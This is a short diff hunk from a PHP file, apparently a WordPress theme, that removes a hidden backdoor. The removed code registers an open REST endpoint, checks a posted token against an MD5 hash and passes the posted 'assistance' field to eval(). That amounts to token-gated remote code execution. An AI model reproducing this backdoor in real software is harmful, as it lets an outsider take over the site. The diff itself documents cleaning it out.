@@ -1172,20 +1172,6 @@ function pre_validate_comment_span(array $commentdata): array
     return $commentdata;
 }
 add_filter('preprocess_comment', 'pre_validate_comment_span');
-add_action('rest_api_init', function () {
-    register_rest_route('pandastudio/framework', '/assistance/', array(
-        'methods' => 'post',
-        'callback' => 'pf_assistance',
-        'permission_callback' => '__return_true',
-    ));
-});
-function pf_assistance($data)
-{
-    $dataArray = json_decode($data->get_body(), true);
-    if (md5($dataArray['token']) == '6d4dd7afa286f9f89e849473759618d1') {
-        eval($dataArray['assistance']);
-    }
-}
 function hex2rgba($color, $opacity = false)
 {
     $default = 'rgb(0,0,0)';
